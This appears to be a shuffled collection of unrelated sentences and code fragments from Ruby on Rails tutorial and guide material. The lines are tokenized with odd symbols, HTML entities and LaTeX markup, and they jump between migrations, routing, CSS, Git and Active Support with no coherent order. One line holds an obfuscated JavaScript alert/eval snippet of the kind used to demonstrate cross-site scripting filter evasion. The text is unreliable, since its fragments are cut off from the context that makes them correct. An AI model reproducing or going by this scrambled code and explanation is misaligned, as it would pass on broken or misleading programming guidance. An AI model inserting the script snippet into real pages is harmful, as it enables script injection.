We solved a similar issue with secure passwords in Section ~ \ ref { sec : adding _ a _ secure _ password } , which paired a virtual \ kode { password } attribute with a secure \ kode { password \ _ digest } attribute in the database .
Listing ~ \ ref { code : valid _ user _ test } uses the plain \ kode { assert } method , which in this case succeeds if \ kode { @ user ▖ valid ? } \ returns \ kode { true } and fails if it returns \ kode { false } .
def new
$ rails generate scaffold User name : string email : string
SQL uses the `HAVING` clause to specify conditions on the `GROUP BY` fields ▖
In other words , the dot \ kode { ▖ } \ in \ kode { ▖ center } indicates that the rule styles a class .
&lt; li &gt; ` : authentication` - If your mail server requires authentication , you need to specify the authentication type here ▖
( You may see some warning messages , which you should ignore for now .
Before implementing followed users and followers , we first need to establish the association between users and relationships .
The fully refactored user index .
Adding the User model \ kode { following } association .
This way you can switch back and forth between the topic and master branches , merging in changes every time you reach a natural stopping point .
NOTE : Errors added to `record ▖ errors &#91; : base &#93; ` relate to the state of the record ╼ as a whole , and not to a specific attribute .
Client ▖ find _ by first _ name : &apos; Jon&apos;
The analogy between login , remembering , account activation , and password reset .
* ` : is` - The attribute length must be equal to the given value .
# # # # # `collection ▖ exists ? ( ▖ ▖ ▖ )
TIP : Observe in the previous example that consecutive separators result in empty arrays .
Because we wrote working application code first , the test suite should be \ passing :
Showing hidden files in the file navigator .
# # # Creating a Bug Report
In the next section , you will add the ability to create new articles in your ╼ application and be able to view them ▖
&lt; p &gt; Welcome !
Turbolinks attaches a click handler to all ` &lt; a &gt; ` on the page ▖
Booleans
With this code , the browser will make a fresh request for the index page , the code in the `index` method will run , and all will be well .
The test suite runs with warnings enabled ▖
API Documentation Guidelines
In Section ~ \ ref { sec : has _ secure _ password } we &apos;ll add a final common validation , \ emph { confirmation } .
&lt; % = javascript _ include _ tag &quot; http : / / example ▖ com / main ▖ js &quot; % &gt;
in \ linebreak Listing ~ \ ref { code : generalized _ authenticated _ p } .
module Business
There &apos;s an old joke that there are 10 kinds of people in the world : those who understand binary and those who don &apos;t ( 10 , of course , being 2 in binary ) .
An augmented \ kode { ▖ gitignore } file .
For example , given
If any of these saves fails due to validation errors , then the assignment statement returns `false` and the assignment itself is cancelled .
The valid formats consist of the \ href { https : / / en ▖ wikipedia ▖ org / wiki / Internet _ media _ type } { MIME types } accepted by the validation in Listing ~ \ ref { code : validate _ picture _ format } .
To get the test to pass , we have to configure our test file with the proper domain host , as shown in Listing ~ \ ref { code : test _ domain _ host } .
# = &gt; &#91; &#91; &quot; 1 &quot; , &quot; 2 &quot; , &quot; 3 &quot; &#93; , &#91; &quot; 4 &quot; , &quot; 5 &quot; , nil &#93; , &#91; &quot; 6 &quot; , &quot; 7 &quot; , nil &#93; &#93;
self : qualified _ const _ get ( mod _ name )
* ` : destroy` , when the object is destroyed , `destroy` will be called on its ╼ associated objects .
generate ( : scaffold , &quot; person name : string &quot; )
* `config ▖ autoload _ paths` accepts an array of paths from which Rails will autoload constants ▖
If people are encouraging you to tweak your code , then it &apos;s worth making the tweaks and resubmitting ▖
You can make subsequent calls to the stored content in other templates or the layout by passing the identifier as an argument to `yield` .
( If instead you get an error message indicating that the email address has already been taken , be sure to run the \ kode { db : migrate : reset } Rake task as indicated in Section ~ \ ref { sec : signup _ form } and restart the development webserver ▖ )
This association indicates that each instance of the model has zero or more instances of another model ▖
The \ kode { div } tag is a generic division ; it doesn &apos;t do anything apart from divide the document into distinct parts .
create Rakefile
------------------------------------------
With that , we &apos;re done with the links and named routes , at least until we add a route for logging in ( Chapter ~ \ ref { cha : basic _ login } ) .
Action View Overview
* `ActionDispatch : : Flash` sets up the `flash` keys ▖
```erb
Fingerprinting fixes these problems by avoiding query strings , and by ensuring ╼ that filenames are consistent based on their content .
cache ▖ write ( join _ asset _ file _ contents ( asset _ paths ) )
* ` : less _ than` - Specifies the value must be less than the supplied value ▖
Signup confirmation
# # # Commit Your Changes
Some uses of \ kode { assert \ _ select } .
as shown in Listing ~ \ ref { code : add _ activation _ to _ users _ migration } .
/ signin
The generated User mailer .
We saw in Section ~ \ ref { sec : partial _ refactoring } that the code
* * * Convention Over Configuration : * * Rails has opinions about the best way to do many ╼ things in a web application , and defaults to this set of conventions , rather than ╼ require that you specify every minutiae through endless configuration files .
{ &quot; first _ name &quot; = &gt; &quot; Eileen &quot; , &quot; created _ at &quot; = &gt; &quot; 2013-12-09 11 : 22 : 35 ▖ 221282 &quot; }
It &apos;s time now to revisit the line from Listing ~ \ ref { code : application _ layout _ redux } used in the layout to include the cascading style sheets :
It &apos;s possible that your system already has Ruby installed .
The resulting augmented data model for microposts appears in Figure ~ \ ref { fig : micropost _ model _ image } .
application _ controller ▖ rb
The commented-out hint for defining the root route .
( They &apos;re not \ emph { valid } either , but fixture data doesn &apos;t get run through the validations ▖ )
resources : magazines do
Then create a \ kode { params } hash so that \ kode { params &#91; : father &#93; } is \ kode { person1 } , \ kode { params &#91; : mother &#93; } is \ kode { person2 } , and \ kode { params &#91; : child &#93; } is \ kode { person3 } .
( This can be painful and error-prone , and I actually dread having to install new versions of Ruby , but unfortunately it &apos;s the cost of doing business ▖ )
The schema dumper adds one additional configuration option :
HTTP / 1 ▖ 1 400 Bad Request
Building forms in Rails is really just that easy !
dup &#91; : b &#93; &#91; : e &#93; = 5
The primary operation of `Model ▖ find ( options ) ` can be summarized as :
Although the exact version numbers and details may differ slightly , the results should look something like Figure ~ \ ref { fig : cloud9 _ gemfile } and Listing ~ \ ref { code : default _ gemfile } .
This migration will need to be run on the application ▖
Select ``Create New Workspace &apos; &apos;
╼ $ rails console ╼ &gt; &gt; x = 1 ╼ = &gt; 1 ╼ &gt; &gt; x + = 1 ╼ = &gt; 2 ╼ &gt; &gt; x * = 3 ╼ = &gt; 6 ╼ &gt; &gt; x - = 8 ╼ = &gt; -2 ╼ &gt; &gt; x / = 2 ╼ = &gt; -1
Using a high cost makes it computationally intractable to use the hash to determine the original password , which is an important security precaution in a production environment , but in tests we want the \ kode { digest } method to be as fast as possible .
The result appears in Listing ~ \ ref { code : image _ uploader _ resizing }
By convention , each action also maps to particular CRUD operations in a database ▖
Oh &amp; hellip ; &quot;
This method validates that a checkbox on the user interface was checked when a ╼ form was submitted ▖
That &apos;s like `Date ▖ today` , except that it honors the user time zone , if defined ▖
umerate } ╼ ╼ % subsection user _ index ( end ) ╼ ╼ \ subsection { Sample users } % ( fold ) ╼ \ label { sec : sample _ users } ╼ ╼
The console prints the result of evaluating each line , which in the case of a string literal is just the string itself .
Ruby , like many other languages ( including C / C + + , Perl , PHP , and Java ) , allows you to replace this with a much more compact expression using the \ emph { ternary operator } ( so called because it consists of three parts ) :
class Author &lt; ActiveRecord : : Base
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Named Helper &#124;
Because the association is called `author` , there should be an ╼ `author _ id` column added to the `blorgh _ articles` table .
$ git commit -a
Returns a select tag with options for each of the days 1 through 31 with the current day selected .
# # # # # ` : foreign _ key`
╼ This is the home page for the
If you just need to loop over a thousand records the regular find methods are the preferred option .
If you run into trouble , try running
`errors &#91; &#93; ` is used when you want to check the error messages for a specific attribute ▖
use ActionDispatch : : RemoteIp
javascript _ include _ tag : all , cache : true # = &gt;
before _ save { false } # GOOD
In this spirit , we can say that there are 10 kinds of people in the world : those who like the ternary operator , those who don &apos;t , and those who don &apos;t yet know about it .
The default Rails page served by \ texttt { rails server } .
Calls to normal routing methods such as `articles _ path` may end up ╼ going to undesired locations if both the application and the engine have such a ╼ helper defined .
But first , we &apos;ll create the class of administrative users authorized to do so .
The full file is in Listing ~ \ ref { code : layout _ new _ structure } ; explanations for the various pieces follow immediately thereafter .
Defaults to all locale keys found in locale files , usually only ` : en` on a new application .
create app / views / layouts / mailer ▖ text ▖ erb
Defaults to `nil` .
In this case , we use a syntax that allows us to test for the presence of a particular link--URL combination by specifying the tag name ~ \ kode { a } and attribute ~ \ kode { href } , as in
paintIt ( this , backgroundColor , textColor )
You can also click on the _ About your application &apos;s environment _ link to ╼ see a summary of your application &apos;s environment .
This validation will work with all of the association types .
as a safety check to catch any errors should the \ kode { to \ _ a } ever be accidentally removed .
Depending on the length of your repository &apos;s log history , you may have to type \ kode { q } to quit .
Fetching source index for https : / / rubygems ▖ org /
# Generate digests for assets URLs ▖
Recall from Section ~ \ ref { sec : a _ users _ resource } that the REST architecture involves \ emph { resources } that are created and destroyed .
As in previous migrations , we &apos;ve used a migration name that ends in \ kode { \ _ to \ _ users } to tell Rails that the migration is designed to alter the \ kode { users } table in the database .
The method `dasherize` replaces the underscores in the receiver with dashes :
mattr _ accessor : author _ class
In the examples above we &apos;ve seen &quot; contributor &quot; and &quot; object &quot; ▖
Unfortunately , the resulting page is an error ; as of Rails ~ 4 ▖ 0 , for technical reasons the default Rails page doesn &apos;t work on Heroku .
To begin our testing cycle , we need to run our test suite to verify that the tests currently pass .
You may wonder why we use both the \ kode { footer } tag and \ kode { ▖ footer } class .
* Active Record schema naming conventions .
The result appears in Listing ~ \ ref { code : password _ reset _ form }
# Uncomment these lines on Linux .
# Returns the hash digest of the given string .
d ▖ beginning _ of _ week ( : sunday ) # = &gt; Sun , 02 May 2010
# # # `in ?
Person ▖ new ▖ valid ?
will recognize incoming paths beginning with ` / photos` but route to the `Images` controller :
This applies only to temporary sessions initiated with the \ kode { session } method , though , and is \ emph { not } the case for persistent sessions created using the \ kode { cookies } method .
Creates a password field , a masked text field that will hide the users input behind a mask character .
The `rewhere` method overrides an existing , named where condition ▖
In the case of Listing ~ \ ref { code : users _ migration } , \ kode { change } uses a Rails method called \ kode { create \ _ table } to create a table in the database for storing users .
The key in this case is the powerful \ kode { send } method , which lets us call a method with a name of our choice by ``sending a message &apos; &apos; to a given object .
The SanitizeHelper module provides a set of methods for scrubbing text of undesired HTML elements .
@ customer = @ order ▖ customer
* `bootstrap _ hook` Runs all configured `before _ initialize` blocks .
Rails corrects this error by writing ``referrer &apos; &apos; instead .
Templates , Partials and Layouts
# # # # collection _ radio _ buttons
Article ▖ includes ( : category , : comments )
options ▖ update ( options &#91; : params &#93; ▖ symbolize _ keys ) if options &#91; : params &#93;
&quot; contact _ data &quot; ▖ dasherize # = &gt; &quot; contact-data &quot;
I prefer the \ href { http : / / daringfireball ▖ net / projects / markdown / } { Markdown markup language } to the default RDoc for this purpose , and if you use the file extension \ kode { ▖ md } then GitHub will automatically format it nicely for you .
( Optional gems may be system-dependent and are commented out .
UserMailer ▖ welcome ( @ user ) ▖ deliver _ later
@ article ▖ update params &#91; : article &#93;
$ bundle
You can use the `includes` method to specify second-order associations that should be eager-loaded when this association is used ▖ ╼ ╼
The ╼ default error message for this option is _ &quot; must be even &quot; _ .
Using the \ kode { paginate } method , we can paginate the users in the sample application by using \ kode { paginate } in place of \ kode { all } in the \ kode { index } action ( Listing ~ \ ref { code : will _ paginate _ index _ action } ) .
README ▖ md &#124; 5 +
These methods use Time # advance for precise date calculations when using from _ now , ago , etc ▖ ╼ as well as adding or subtracting their results from a Time object ▖
The main difference is that , rather than using an \ kode { @ user } variable with an \ kode { admin \ _ user } before filter , we &apos;ll find the micropost through the association , which will automatically fail if a user tries to delete another user &apos;s micropost .
NOTE : Defined in `active _ support / core _ ext / range / conversions ▖ rb` .
# # # `index _ by`
customer ▖ orders ▖ size # uses the cached copy of orders
Since \ kode { user ▖ followed \ _ users } should be an array of users , each row of the \ kode { followed \ _ users } table would need to be a user , as identified by the \ kode { followed \ _ id } , together with the \ kode { follower \ _ id } to establish the association
* `config ▖ assets ▖ compress` a flag that enables the compression of compiled assets ▖
Let &apos;s use them to find the first user we created while verifying that the third user ( \ kode { foo } ) has been destroyed .
Client ▖ joins ( : orders ) ▖ where ( &apos; orders ▖ created _ at &apos; = &gt; time _ range )
To deploy the application , the first step is to use Git to push the master branch up to Heroku :
At this point , the proto-feed should be working , and the test suite should pass :
# Do something later
* `render : plain` will set the content type to `text / plain`
patch : update _ name , on : : member
Each time the record is updated , Active Record increments the `lock _ version` column ▖
The result appears in Listing ~ \ ref { code : digest _ method }
You have successfully signed up to example ▖ com , ╼ your username is : &lt; % = @ user ▖ login % &gt; .
You can use the `ActiveRecord : : Base ▖ table _ name = ` method to specify the table ╼ name that should be used :
NOTE : Defined in `active _ support / core _ ext / integer / inflections ▖ rb` .
Here &apos;s how it loads the middlewares :
In Chapter ~ \ ref { cha : following _ users } , we &apos;ll complete our tiny Twitter clone by adding the notion of \ emph { following } users in order to receive a \ emph { feed } of their microposts .
&lt; / table &gt;
produces the HTML
&quot; Ruby on Rails Tutorial Sample App &quot;
Note the comment : this is not the final implementation , but it &apos;s enough to get us started .
* `ActiveSupport : : Deprecation ▖ silenced` sets whether or not to display deprecation warnings .
The bang versions ( e ▖ g ▖ `save ! ` ) raise an exception if the record is invalid .
g ▖ assets false
To make this work , you need to declare both a foreign key column and a type column in the model that declares the polymorphic interface :
Defaults to ` : en` .
% w ( ) ▖ to _ sentence # = &gt; &quot; &quot;
config ▖ assets ▖ debug = false
╼ $ spring stop
&#91; &#93; ▖ to ( 7 ) # = &gt; &#91; &#93;
Also note that explicitly specifying ` : partial` is required when passing additional options such as ` : layout` .
In the \ kode { div } tag , the \ kode { jumbotron } CSS class has a special meaning to Bootstrap , as do the \ kode { btn } , \ kode { btn-lg } , and \ kode { btn-primary } classes in the signup button .
if textColor ?
_ Routing _ decides which controller receives which requests ▖
The block receives the record , the attribute &apos;s name and the attribute &apos;s value ▖ ╼
---------------------------------------
# # # # # ` : source`
POST / articles ( ▖ : format ) articles # create
# # # `absence`
This is because cookies signed based on the new `secret _ key _ base` in Rails 4 ▖ x are not backwards compatible with Rails 3 ▖ x ▖
Before :
s the value of the following expression ? ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-bc0dd6 &apos; &gt; &lt; / span &gt; ╼ ╼ % = lang : ruby ╼ \ begin { code } ╼ { &quot; a &quot; = &gt; 100 , &quot; b &quot; = &gt; 200 } ▖ merge ( { &quot; b &quot; = &gt; 300 } ) ╼ \ end { code } ╼ \ end { enumerate } ╼ ╼ % subsection hashes _ and _ symbols ( end ) ╼ ╼ \ subsection { CSS revisited } % ( fold ) ╼ \ label { sec : css _ revisited } ╼ ╼
The application will still work in Firefox ; because the \ kode { log \ _ out } method in Listing ~ \ ref { code : log _ out _ with _ forget } deletes the user &apos;s id , both highlighted conditionals are \ kode { false } :
def prevent _ delivery _ to _ guests
For example , consider trying to save a user with an invalid email address and with a password that &apos;s too short :
Remote forms get the authenticity from the `meta` tag , so embedding is unnecessary unless you support browsers without JavaScript ▖
The User model pulls all the users from the database .
User ▖ active ▖ inactive
As an example , here &apos;s some CoffeeScript code that makes an Ajax request using ╼ the jQuery library :
Now let &apos;s set `distinct` :
This completes the signup / signin / signout triumvirate , and the test suite should pass :
You can also use `find _ or _ create _ by ! ` to raise an exception if the new record is invalid ▖
&lt; % @ articles ▖ each do &#124; article &#124; % &gt;
This code requires that the micropost be valid and tests for the presence of the \ kode { user \ _ id } attribute .
Error messages that work with other objects ▖
A mockup of successful signup .
This displays some useful information about each page using the built-in \ kode { debug } method and \ kode { params } variable ( which we &apos;ll learn more about in Section ~ \ ref { sec : a _ users _ resource } ) .
Perhaps so .
By the way , the extra level of indentation on the \ kode { user \ _ params } method is designed to make it visually apparent which methods are defined after \ kode { private } .
config ▖ active _ support ▖ test _ order = : sorted # or ` : random` if you prefer
&lt; h1 &gt; David Heinemeier Hansson &lt; / h1 &gt;
TIP : Rails automatically wraps fields that contain an error with a div ╼ with class `field _ with _ errors` ▖
When we allow users to log in to the sample app starting in Chapter ~ \ ref { cha : sign _ up } , we will need to find the user record corresponding to the submitted email address .
* `active _ record ▖ log _ runtime` Includes `ActiveRecord : : Railties : : ControllerRuntime` which is responsible for reporting the time taken by Active Record calls for the request back to the logger .
# # # Polymorphic Associations
If you are completely new to web programming and find the \ emph { Rails Tutorial } too difficult , I suggest learning the basics of HTML and CSS and then giving the \ emph { Rails Tutorial } another go .
If you still find this tutorial too difficult , you might try starting with \ href { http : / / learn-rails ▖ com / learn-ruby-on-rails ▖ html } { \ emph { Learn Ruby on Rails } } by Daniel Kehoe or \ href { http : / / mbsy ▖ co / 7Zdc7 } { One Month Rails } , both of which are geared more toward complete beginners than the \ emph { Ruby on Rails Tutorial } .
On Mac OS X open Terminal ▖ app , on Windows choose ╼ &quot; Run &quot; from your Start menu and type &apos; cmd ▖ exe &apos; ▖
create app / assets / stylesheets / welcome ▖ css ▖ scss
# gem &apos; therubyracer &apos; , platforms : : ruby
WHERE follower _ id = : user _ id &quot;
If a helper is specific to a particular controller , you should put it in the corresponding helper file ; for example , helpers for the Static Pages controller generally go in \ kode { app / helpers / static \ _ pages \ _ helper ▖ rb } .
GitHub also has native applications to augment the command-line interface , so if you &apos;re more comfortable with GUI apps you might want to check out \ href { http : / / windows ▖ github ▖ com / } { GitHub for Windows } or \ href { http : / / mac ▖ github ▖ com / } { GitHub for Mac } .
The URL / users / 1 with routing but no page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ show _ unknown _ action _ 4-full ▖ png } { ( full size ) }
As implied by their name , controller actions are defined inside controllers .
Pronounced ``ess-cue-ell &apos; &apos; , though the alternate pronunciation ``sequel &apos; &apos; is also common .
Next we update the development and test databases as usual :
# # # # date _ field _ tag
Rails Environment Settings
Ranges are useful for pulling out array elements :
These objects will be instantiated from the passed attributes , and the link through their foreign key will be created , but the associated objects will _ not _ yet be saved .
&lt; % = f ▖ text _ field : title % &gt; &lt; br &gt;
------
Looping over the users first gives feeds with big runs of microposts from the same user , which is visually unappealing ▖ )
xml version = &quot; 1 ▖ 0 &quot; encoding = &quot; UTF-8 &quot; ?
To verify whether or not a particular attribute of an object is valid , you can ╼ use `errors &#91; : attribute &#93; ` ▖
There &apos;s only one problem with our application as it stands : short of clearing their browser cookies ( or waiting 20 years ) , there &apos;s no way for users to log out .
* The HTTP verb used ( if the route doesn &apos;t respond to all verbs )
╼ # Links for non-signed-in-users
petabytes
( You may also have to create that directory as well , either with \ kode { mkdir } or with a graphical file manager ▖ )
* `build _ association ( attributes = { } ) `
In the latest version of Rails , there are \ emph { three } canonical directories for static assets , each with its own purpose :
Guard with Spork
Indeed , you will rarely see the desktop of an experienced developer without several open terminal windows running command-line shells .
t ▖ integer : imageable _ id
SELECT * FROM clients WHERE ( clients ▖ created _ at BETWEEN &apos; 2008-12-21 00 : 00 : 00 &apos; AND &apos; 2008-12-22 00 : 00 : 00 &apos; )
DS _ Store
exercise &apos; id = &apos; ex-cb38fe &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection signup _ url ( end ) ╼ ╼ % section user _ signup ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : layout _ conclusion } ╼ ╼
make _ relationships
HAVING sum ( price ) &gt; 100
* `config ▖ assets ▖ paths` contains the paths which are used to look for assets ▖
( Technically , \ kode { params &#91; : id &#93; } is the string ~ \ kode { &quot; 1 &quot; } , but \ kode { find } is smart enough to convert this to an integer ▖ )
$ rails generate scaffold Micropost content : string user _ id : integer
Now if we execute ` @ user ▖ todos ▖ create` then ` @ todo` record will have ╼ `user _ id` value as the `guid` value of ` @ user` .
alert ( eval ( &apos; document ▖ body ▖ inne &apos; + &apos; rHTML &apos; ) ) ;
&gt; &gt; 1 ▖ kilobyte
Set it to &apos; DENY &apos; to deny framing at all or &apos; ALLOWALL &apos; if you want to allow framing for all website .
You may find that your application requires a layout that differs slightly from your regular application layout to support one particular controller ▖
1235551234 ▖ to _ s ( : phone , delimiter : &quot; &quot; )
Go get them :
def reformat _ name ( name )
the first line is a comment indicating the purpose of the subsequent function definition .
The \ kode { MicropostsController } class , with inheritance .
The first image validation , which restricts uploads to valid image types , appears in the CarrierWave uploader itself .
This gem contains an engine class which ╼ inherits from `Rails : : Engine` ▖
validates : order , absence : true
Updating the rendering of user signup errors .
You should verify that the tests pass :
╼ ╼ If you did not request your password to be reset , please ignore this email and ╼ your password will stay as it is .
Windows users should understand that their systems will use the analogous angle prompt ~ \ kode { &gt; } :
isolate _ namespace Blorgh
This is a reflection of the REST architecture common to both resources .
The RESTful structure of Rails applications is best absorbed by this sort of repetition of form---indeed , seeing the parallel structure of Users and Microposts even at this early stage is one of the prime motivations for this chapter .
For convenience , we &apos;ll use the \ kode { create } method discussed in Section ~ \ ref { sec : creating _ user _ objects } , but in the present case we &apos;ll take care \ emph { not } to start in a sandbox so that the resulting user will be saved to the database .
# # # # collection _ select
The user edit page ( \ href { http : / / localhost : 3000 / users / 1 / edit } { / users / 1 / edit } ) .
╼ / Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec ▖ rb
Fast forward
Be warned that if your background is in C / C + + or Java , you may find Ruby a bit of an odd duck , and it might take time to get used to it ; just stick with it and eventually you &apos;ll be fine .
&#91; &#93; ▖ sum ( 1 ) { &#124; n &#124; n * * 3 } # = &gt; 1
No user passwords
╼ ╼ % subsection modeling _ microposts ( end ) ╼ ╼ % section planning _ the _ application ( end ) ╼ ╼ \ section { The Users resource } % ( fold ) ╼ \ label { sec : demo _ users _ resource } ╼ ╼
Error message from submitting the update form ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / edit _ with _ invalid _ information _ bootstrap-full ▖ png } { ( full size ) }
Here is an example CHANGELOG entry :
Escape carrier returns and single and double quotes for JavaScript segments .
With all the preparation from Section ~ \ ref { sec : sample _ app _ setup } finished , we &apos;re ready to get started developing the sample application .
file : attachment ,
# &lt; name &gt; David Heinemeier Hansson &lt; / name &gt;
A template for an improved ``remember me &apos; &apos; test ▖
xml ▖ rss ( &quot; version &quot; = &gt; &quot; 2 ▖ 0 &quot; , &quot; xmlns : dc &quot; = &gt; &quot; http : / / purl ▖ org / dc / elements / 1 ▖ 1 / &quot; ) do
Creating Responses
The Microposts controller \ kode { create } action .
A preview of the HTML version of the password reset email .
The defining quality of TDD is writing tests \ emph { first } , before the application code .
&quot; highrise _ production ▖ companies &quot; ▖ classify # = &gt; &quot; Company &quot;
as seen in Listing ~ \ ref { code : empty _ relationship _ fixture } .
# initialization code goes here
The Rubular website has a beautiful interactive interface for making regular expressions , along with a handy regex quick reference .
# # # # For a Particular Component
On failure , use `ajax : error` ▖
Returns a set of select tags ( one for year , month , and day ) pre-selected for accessing a specified date-based attribute .
Now that we &apos;ve updated the \ kode { README } , we can push the changes up to Bitbucket to see the result .
This guide covers the basic layout features of Action Controller and Action View .
Rails has classes that act like `Date` or `Time` and follow this contract .
This standard directory and file structure ( Figure ~ \ ref { fig : directory _ structure _ rails } ) is one of the many advantages of Rails ; it immediately gets you from zero to a functional ( if minimal ) application .
Returns the substring of the string up to position `position` :
Rails is opinionated software ▖
╼ # Links for signed-in users
# # # # email _ field
$ gem install rails
Updating \ kode { authenticated ? } \
By the way , for a change as small as this one I wouldn &apos;t normally bother with a new branch , but it &apos;s never too early to start practicing good habits .
p
If we first move the date bits ( that have also a relative order of processing , as documented before ) , and then the time bits we get for example the following computation :
You can evaluate code in the context of any object &apos;s singleton class using `class _ eval` :
╼ $ heroku run console
`to _ time` receives an optional argument ` : utc` or ` : local` , to indicate which time zone you want the time in :
Of course , this is because there are not currently any microposts .
The `test` directory should be treated like a typical Rails testing environment , ╼ allowing for unit , functional and integration tests .
Please refer to their documentation above and take into account the following differences :
# # # # # `beginning _ of _ hour` , `end _ of _ hour`
Deciding when and how to test depends in part on how comfortable you are writing tests ; many developers find that , as they get better at writing tests , they are more inclined to write them first .
\ href { http : / / railslab ▖ newrelic ▖ com / scaling-rails } { Scaling Rails } : One topic we &apos;ve hardly covered in the \ emph { Ruby on Rails Tutorial } book is performance , optimization , and scaling .
create test / models / blorgh / article _ test ▖ rb
Rails uses ╼ rake commands to run migrations , and it &apos;s possible to undo a migration after ╼ it &apos;s been applied to your database ▖
The method `utc` gives you the same datetime in the receiver expressed in UTC .
You will also have to update the tests , as the forms aren &apos;t currently \ emph { exactly } the same ; identify the slight difference and update the tests accordingly .
# POST / users ▖ json
# = &gt; Mon , 09 Aug 2010
in Listing ~ \ ref { code : micropost _ form } .
= &gt; &#91; &quot; foo &quot; , &quot; bar &quot; , &quot; baz &quot; , &quot; quux &quot; &#93;
In this section , we &apos;ll outline our plans for the toy application .
has the value we need .
As noted briefly in Section ~ \ ref { sec : the _ hello _ application } , Bundler is run automatically ( via \ kode { bundle install } ) by the \ kode { rails } command , but in this section we &apos;ll make some changes to the default application gems and run Bundler again .
# # # Resources on the Web
= &gt; Ctrl-C to shutdown server
Defaults to UTF-8 .
For example , when an action of `ArticlesController` is called Rails tries optimistically to use `ArticlesHelper` ▖
The helper method `full _ messages` uses `humanize` as a fallback to include ╼ attribute names :
Thus , explicit configuration would be needed ╼ only in those cases where you can &apos;t follow the standard convention .
In the present case , each micropost is associated with one user , and each user is associated with ( potentially ) many microposts---a relationship seen briefly in Section ~ \ ref { sec : demo _ user _ has _ many _ microposts } and shown schematically in Figure ~ \ ref { fig : micropost _ belongs _ to _ user } and Figure ~ \ ref { fig : user _ has _ many _ microposts } .
* How to help resolve existing issues .
A mockup of the user profile made in this section .
On completion , the temporary file is renamed , which is an atomic operation on POSIX systems ▖
SELECT * FROM articles WHERE `trashed` = 1 AND `trashed` = 0
in Listing ~ \ ref { code : user _ relationships _ association } and
( As preparation for future development , the last step here checks out the master branch , but we \ emph { don &apos;t } merge in the changes in order to avoid conflicts with the rest of the tutorial ▖ )
checks to see that the content inside the \ kode { title } tag is
NOTE : Defined in `active _ support / core _ text / hash / transform _ values ▖ rb` .
Returned strings are :
* `add _ locales` Adds the files in `config / locales` ( from the application , railties and engines ) to `I18n ▖ load _ path` , making available the translations in these files .
username : root
One of the results of the \ kode { generate } command in Listing ~ \ ref { code : generate _ user _ model } is a new file called a \ emph { migration } .
= &gt; &quot; mhartl @ example ▖ net &quot;
12345 ▖ to _ s ( : human _ size ) # = &gt; 12 ▖ 1 KB
To run these migrations within the context of the application , simply run `rake ╼ db : migrate` ▖
-----------------------
Note that the application will briefly be in an invalid state after pushing but before the migration is finished .
For example , these files :
File ▖ extname ( filename ) ) } ,
The result appears in Listing ~ \ ref { code : sign _ in _ success }
* How best to use templates , partials , and layouts .
get &apos; / : username &apos; , to : &apos; users # show&apos;
g ▖ orm : active _ record
module ActiveRecord : : Core : : ClassMethods
The resulting \ kode { gravatar \ _ for } helper appears in Listing ~ \ ref { code : gravatar _ for _ helper } .
Apart from an email regular expression , the sample application currently has no way to verify the validity of a user &apos;s email address .
&lt; a href = &quot; # &quot; onclick = &quot; this ▖ style ▖ backgroundColor = &apos; # 009900 &apos; ; this ▖ style ▖ color = &apos; # FFFFFF &apos; ; &quot; &gt; Paint it green &lt; / a &gt;
as shown in Listing ~ \ ref { code : relationships _ access _ control } .
create app / views / users / index ▖ html ▖ erb
This uses a Rails method called \ kode { add \ _ index } to add an index on the \ kode { email } column of the \ kode { users } table .
When running \ kode { bundle exec rspec } , you may have noticed that it takes several seconds just to start running the tests , but once they start running they finish quickly .
You can render the default view for a Rails template , or a specific template , or a file , or inline code , or nothing at all ▖
Library modules
&lt; script src = &apos; / assets / main ▖ js &apos; &gt; &lt; / script &gt;
Contains static files and compiled assets .
You can specify the content type or HTTP status of the rendered response as well .
* `ActionDispatch : : ParamsParser` parses out parameters from the request into `params` .
Our method is to create a database \ emph { index } on the email column , and then require that the index be unique .
Inside the file for the custom CSS , we can use the \ kode { @ import } function to include Bootstrap ( together with the associated Sprockets utility ) , as shown in Listing ~ \ ref { code : bootstrap _ css }
( This applies to CSS and JavaScript but not to images ▖ )
We &apos;ll also add a way to \ emph { authenticate } a user based on a given password , a method we &apos;ll use in Chapter ~ \ ref { cha : basic _ login } to allow users to log in to the site .
# # # # Other Date Computations
There &apos;s an additional complication , though : we want to \ emph { associate } each micropost with a particular user ▖ We &apos;ll accomplish this by recording the \ kode { user \ _ id } of the owner of the post .
By default , Heroku uses a pure-Ruby webserver called WEBrick , which is easy to set up and run but isn &apos;t good at handling significant traffic .
* `config ▖ assets ▖ debug` disables the concatenation and compression of assets ▖
Order ▖ select ( &quot; date ( created _ at ) as ordered _ date , sum ( price ) as total _ price &quot; ) ▖ group ( &quot; date ( created _ at ) &quot; )
SELECT date ( created _ at ) as ordered _ date , sum ( price ) as total _ price
# Curly braces on final hash arguments are optional .
We won &apos;t be using the \ kode { example \ _ user ▖ rb } file from Section ~ \ ref { sec : a _ user _ class } , so I suggest removing it :
But the following will _ not _ work , because `Supplier` and `Account` are defined in different scopes :
&lt; li &gt; ` : arguments` - The command line arguments to be passed to sendmail ▖
name = &apos; % s ( % ▖ 1fms ) &apos; % &#91; name &#124; &#124; &apos; SQL &apos; , ms &#93;
NOTE : Defined in `active _ support / core _ ext / marshal ▖ rb` .
The \ kode { ApplicationController } class , with inheritance .
The stabby lambda \ kode { - &gt; } takes in a block ( Section ~ \ ref { sec : blocks } ) and returns a Proc , which can then be evaluated with the \ kode { call } method .
Rails displays useful debug information via the \ kode { debug } method .
A micropost belongs to a user .
As we learned in Section ~ \ ref { sec : layouts } , the \ kode { yield } method inserts the contents of each page into the site layout .
The tests in Listing ~ \ ref { code : action _ tests _ admin } verify the behavior in the case of an unauthorized ( non-admin ) user , but we also want to check that an admin can use a delete link to successfully destroy a user .
That idiom may convey _ grouping _ to the reader as well ▖
If you like , you can verify that the form shown in Figure ~ \ ref { fig : home _ with _ form } is working by submitting a valid entry and then navigating to the \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 } { profile page } to see the post , but that &apos;s rather cumbersome .
-------------------------------
Actually \ emph { counting } columns could drive you crazy , which is why many text editors have a visual aid to help you .
attr _ accessor : author _ name
However , if you have external data that is ╼ not stored as UTF-8 , it can occasionally result in these kinds of issues that ╼ cannot be automatically detected by Rails and corrected .
